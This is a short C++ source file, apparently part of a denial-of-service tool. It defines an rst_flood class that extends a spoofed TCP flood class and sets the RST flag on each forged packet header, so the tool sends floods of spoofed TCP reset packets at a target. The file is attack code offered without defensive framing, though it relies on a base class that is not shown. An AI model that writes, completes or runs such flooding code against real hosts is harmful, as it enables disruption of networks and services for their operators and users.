#include "rst_flood.hpp"

rst_flood::rst_flood() : spoofed_tcp_flood() {}

void rst_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_RST;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}